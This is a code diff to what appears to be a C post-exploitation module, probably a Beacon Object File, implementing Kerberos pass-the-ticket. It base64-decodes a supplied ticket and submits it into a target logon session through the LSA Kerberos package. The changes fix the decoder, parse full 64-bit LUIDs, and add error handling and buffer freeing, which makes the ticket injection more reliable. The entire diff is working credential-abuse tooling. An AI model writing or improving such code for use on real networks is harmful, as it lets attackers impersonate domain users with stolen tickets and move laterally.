@@ -36,10 +36,10 @@ byte* base64_decode(byte* input, int* output_len) {
 
     size_t i = 0, j = 0;
     while (i < input_len - padding) {
-        UINT sextet_a = input[i] == '=' ? 0 : (UINT)base64_decode_char(input[i++]);
-        UINT sextet_b = input[i] == '=' ? 0 : (UINT)base64_decode_char(input[i++]);
-        UINT sextet_c = input[i] == '=' ? 0 : (UINT)base64_decode_char(input[i++]);
-        UINT sextet_d = input[i] == '=' ? 0 : (UINT)base64_decode_char(input[i++]);
+        UINT sextet_a = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;
+        UINT sextet_b = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;
+        UINT sextet_c = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;
+        UINT sextet_d = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;
 
         UINT triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;
 
@@ -128,44 +128,23 @@ int my_islower(int c) {
     return (c >= 'a' && c <= 'z');
 }
 
-long int my_strtol(const char* str, char** endptr, int base) {
-    long int result = 0;
-    int sign = 1;
-
-    if (*str == '-' || *str == '+') {
-        sign = (*str == '-') ? -1 : 1;
-        str++;
+unsigned long long my_strtoull(const char* str) {
+    unsigned long long result = 0;
+    if (!str) return 0;
+    if (*str == '0' && (*(str + 1) == 'x' || *(str + 1) == 'X')) {
+        str += 2;
     }
-
-    while (my_isdigit(*str) ||
-           (base == 16 && (*str >= 'a' && *str <= 'f')) ||
-           (base == 16 && (*str >= 'A' && *str <= 'F'))) {
+    while (*str) {
+        char c = *str;
         int digit = 0;
-        if (my_isdigit(*str)) {
-            digit = *str - '0';
-        }
-        else if (base == 16) {
-            digit = (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
-        }
-
-        if (digit >= base)
-            break;
-
-        if (result > (LONG_MAX - digit) / base) {
-            if (sign == 1)
-                return LONG_MAX;
-            else
-                return LONG_MIN;
-        }
-
-        result = result * base + digit;
+        if (c >= '0' && c <= '9') digit = c - '0';
+        else if (c >= 'a' && c <= 'f') digit = c - 'a' + 10;
+        else if (c >= 'A' && c <= 'F') digit = c - 'A' + 10;
+        else break;
+        result = result * 16 + digit;
         str++;
     }
-
-    if (endptr != NULL)
-        *endptr = (char*)str;
-
-    return result * sign;
+    return result;
 }
 
 void PTT(char* luid, byte* ticket) {
@@ -175,36 +154,48 @@ void PTT(char* luid, byte* ticket) {
     bool   IsHighIntegrity = IsSystem(hToken);
 
     if (luid) {
-        targetLuid.LowPart = my_strtol(luid, NULL, 16);
-        if (targetLuid.LowPart == 0 || targetLuid.LowPart == LONG_MAX || targetLuid.LowPart == LONG_MIN) {
+        unsigned long long parsedLuid = my_strtoull(luid);
+        if (parsedLuid == 0) {
             PRINT_OUT("[x] Invalid luid\n");
             return;
         }
+        targetLuid.LowPart = (DWORD)(parsedLuid & 0xFFFFFFFF);
+        targetLuid.HighPart = (LONG)(parsedLuid >> 32);
     }
     else {
         targetLuid = currentLuid;
     }
 
-    if (!IsHighIntegrity && currentLuid.LowPart != targetLuid.LowPart) {
+    if (!IsHighIntegrity && (currentLuid.LowPart != targetLuid.LowPart || currentLuid.HighPart != targetLuid.HighPart)) {
         PRINT_OUT("[X] You need to be in SYSTEM integrity.\n");
         return;
     }
 
-    if (currentLuid.LowPart != targetLuid.LowPart)
+    if (currentLuid.LowPart != targetLuid.LowPart || currentLuid.HighPart != targetLuid.HighPart)
         IsHighIntegrity = false;
 
     HANDLE hLsa;
     if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;
 
     ULONG authPackage;
-    LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
+    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
     if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {
 
         int decode_ticket_size = 0;
         byte* decode_ticket = base64_decode(ticket, &decode_ticket_size);
+        if (decode_ticket == NULL) {
+            PRINT_OUT("[X] Failed to decode base64 ticket.\n");
+            SECUR32$LsaDeregisterLogonProcess(hLsa);
+            return;
+        }
 
         int submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + decode_ticket_size;
         KERB_SUBMIT_TKT_REQUEST* submitRequest = MemAlloc(submitSize);
+        if (submitRequest == NULL) {
+            PRINT_OUT("[X] Memory allocation failed for submit request.\n");
+            SECUR32$LsaDeregisterLogonProcess(hLsa);
+            return;
+        }
 
         submitRequest->MessageType = KerbSubmitTicketMessage;
         submitRequest->KerbCredSize = decode_ticket_size;
@@ -218,11 +209,20 @@ void PTT(char* luid, byte* ticket) {
 
         NTSTATUS protocolStatus = 0;
         ULONG    responseSize = 0;
-        void* response = 0;
-        if (SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus) || protocolStatus)
-            PRINT_OUT("\n[X] Ticket not imported.\n");
-        else
+        void*    response = NULL;
+
+        NTSTATUS lsaStatus = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus);
+
+        if (lsaStatus != 0 || protocolStatus != 0) {
+            PRINT_OUT("\n[X] Ticket not imported. LSA Status: 0x%08X, Protocol Status: 0x%08X\n", lsaStatus, protocolStatus);
+        }
+        else {
             PRINT_OUT("\n[+] Ticket successfully imported.\n");
+        }
+
+        if (response != NULL) {
+            SECUR32$LsaFreeReturnBuffer(response);
+        }
     }
     SECUR32$LsaDeregisterLogonProcess(hLsa);
 }
